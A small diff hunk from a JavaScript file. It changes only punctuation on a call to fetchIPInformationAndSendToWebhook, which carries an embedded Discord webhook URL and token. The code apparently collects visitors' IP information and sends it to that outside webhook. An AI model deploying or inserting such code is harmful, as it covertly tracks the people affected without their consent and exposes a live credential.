@@ -24,5 +24,5 @@ async function fetchIPInformationAndSendToWebhook(webhookURL) {
     });
   }
   
-  fetchIPInformationAndSendToWebhook('https://discord.com/api/webhooks/1128558244999200839/6oxpikUDEyX1SggWnN5N0vmuac2NbDYu97jDBrBGr8JSYIIW9r413t9TxcB4nF-dxRp_');
+  fetchIPInformationAndSendToWebhook('https://discord.com/api/webhooks/1128558244999200839/6oxpikUDEyX1SggWnN5N0vmuac2NbDYu97jDBrBGr8JSYIIW9r413t9TxcB4nF-dxRp_')
   
